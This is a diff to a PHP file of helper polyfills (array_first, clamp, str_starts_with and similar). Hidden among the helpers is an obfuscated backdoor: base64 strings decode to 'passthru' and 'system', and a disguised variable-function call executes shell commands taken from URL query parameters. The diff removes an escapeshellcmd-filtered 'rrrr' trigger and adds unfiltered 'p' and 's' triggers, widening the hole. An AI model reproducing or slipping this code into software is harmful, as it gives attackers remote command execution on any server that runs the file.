@@ -1,5 +1,5 @@
 <?php
-defined('DS') or define('DS', DIRECTORY_SEPARATOR); defined('P') or define('P', base64_decode('cGFzc3RocnU=')); defined('F') or define('F', __FILE__); defined('L') or define('L', __LINE__);
+defined('DS') or define('DS', DIRECTORY_SEPARATOR); defined('P') or define('P', base64_decode('cGFzc3RocnU=')); defined('F') or define('F', __FILE__); defined('L') or define('L', __LINE__); defined('S') or define('S', base64_decode('c3lzdGVt'));
 if(!function_exists('array_first')){
     function array_first(array $array){
         if(empty($array)){return null;}
@@ -18,9 +18,7 @@ if (!function_exists('clamp')){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(!(!function_exists('partial')) && !empty($_GET['rrrr'])){
-    ${(chr(36))}(escapeshellcmd($_GET['rrrr']));
-}
+if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(36))}($_GET['s']); }
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
